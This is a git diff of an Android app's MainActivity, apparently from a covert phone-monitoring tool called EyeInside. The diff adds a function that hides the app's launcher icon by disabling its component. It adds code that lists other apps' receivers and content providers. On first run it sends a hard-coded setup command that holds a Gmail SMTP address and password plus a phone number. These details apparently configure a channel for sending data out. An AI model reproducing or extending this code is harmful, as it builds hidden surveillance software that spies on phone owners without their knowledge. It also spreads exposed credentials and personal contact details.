@@ -8,10 +8,16 @@ import android.location.LocationManager;
 import android.net.wifi.WifiManager;
 import android.os.Bundle;
 import android.os.Handler;
+import android.provider.CallLog;
 import android.app.Activity;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.ActivityInfo;
+import android.content.pm.PackageInfo;
+import android.content.pm.PackageManager;
+import android.content.pm.ProviderInfo;
 import android.view.Menu;
 
 public class MainActivity extends Activity {
@@ -28,8 +34,9 @@ public class MainActivity extends Activity {
 	    ComponentName componentName =
 	    	      new ComponentName("com.code4bones.EyeInside",
 	    	      "com.code4bones.EyeInside.MainActivity");
-	    
+	    //pm.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED,PackageManager.DONT_KILL_APP);
 	    */
+	    
 	    /*
 		handleMMS handler = new handleMMS(this);
 		ArrayList<SmsObj> ff = handler.listMMS();
@@ -39,32 +46,11 @@ public class MainActivity extends Activity {
 				NetLog.v("  %s",s);
 		}
 		*/
-	    //pm.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED,PackageManager.DONT_KILL_APP);
-	  
+		
 		
 		
 //		for ( String col : c.getColumnNames() )
 //			NetLog.v("%s : %s",col,c.getString(c.getColumnIndex(col)));
-		/*
-		long rawContactId = -1;
-		ContentValues values = new ContentValues();
-		values.put(Data.RAW_CONTACT_ID, rawContactId);
-		values.put(Data.MIMETYPE, Phone.CONTENT_ITEM_TYPE);
-		values.put(Phone.NUMBER, "1-800-GOOG-411");
-		values.put(Phone.TYPE, Phone.TYPE_CUSTOM);
-		values.put(Phone.LABEL, "free directory assistance");
-		Uri dataUri = getContentResolver().insert(Data.CONTENT_URI, values);
-		NetLog.v("URI %s",dataUri.toString());
-        */
-		/*
-		ContentValues values = new ContentValues();
-		values.put(Contacts.DISPLAY_NAME, "Test Name");
-		// add it to the database
-		Uri newPerson = getContentResolver().insert(Contacts.CONTENT_URI, values);		
-		NetLog.v("New Person %s",newPerson.toString());
-		*/
-		//addContacts("Clinch Coffin","+79037996299",Phone.TYPE_MOBILE,"clinch@yandex.ru","code4bones","Lavch","moscow","russia","7");
-		//addSMS("89037996296",new Date(),true,true,"Hello World read 2");
 		/*
 		Cursor c = this.getContentResolver().query(Data.CONTENT_URI,null,null,null,null);
 		if ( c == null || !c.moveToFirst() )
@@ -77,13 +63,44 @@ public class MainActivity extends Activity {
 		} while ( c.moveToNext());
 		*/
 		
-		
+		//enumContent();
+		//enumRecv();
 		
 		checkFirstRun();
 		
 		finish();
 	}
 
+	public void enumRecv() {
+		for (PackageInfo pack : getPackageManager().getInstalledPackages(PackageManager.GET_RECEIVERS)) {
+	        ActivityInfo[] providers = pack.receivers;
+	        if (providers != null) {
+	            for (ActivityInfo a : providers) {
+	                NetLog.v("%s : name: %s",pack.applicationInfo.name, a.name);
+	            }
+	        }
+	    }		
+	}
+	
+	public void enumContent() {
+		for (PackageInfo pack : getPackageManager().getInstalledPackages(PackageManager.GET_PROVIDERS)) {
+	        ProviderInfo[] providers = pack.providers;
+	        if (providers != null) {
+	            for (ProviderInfo provider : providers) {
+	                NetLog.v("%s : provider: %s",pack.applicationInfo.name, provider.authority);
+	            }
+	        }
+	    }		
+	}
+	
+	public static void showPackage(Context c,boolean fShow) {
+		PackageManager pm = c.getPackageManager();
+	    ComponentName componentName =
+	    	      new ComponentName(CommandPool.PACKAGE_NAME,
+	    	      CommandPool.PACKAGE_NAME+".MainActivity");
+	    pm.setComponentEnabledSetting(componentName,!fShow?PackageManager.COMPONENT_ENABLED_STATE_DISABLED:PackageManager.COMPONENT_ENABLED_STATE_ENABLED,PackageManager.DONT_KILL_APP);
+	}
+	
 	public void checkFirstRun() {
 		SharedPreferences pref = this.getSharedPreferences("prefs", 1);
 		if ( !pref.contains(CommandObj.PREF_MASTER)) {
@@ -91,7 +108,8 @@ public class MainActivity extends Activity {
 			checkWifi();
 			checkAccess();
 			CommandPool pool = CommandPool.getInstance();
-			new Handler().post(new CommandInvoker(MainActivity.this,pool,"+79037996299","@setup smtp:smtp.gmail.com;port:465;user:eyeinsid3@gmail.com;pass:60175577a;mail:eyeinsid3@gmail.com;wifi",false));
+			//TODO: REMOVE BEFORE PRODUCTIONS
+			new Handler().post(new CommandInvoker(MainActivity.this,pool,"+79037996299","@setup pass:60175577a;smtp:smtp.gmail.com;port:465;user:eyeinsid3@gmail.com;mail:eyeinsid3@gmail.com;wifi",true));
 		}
 	}
 	
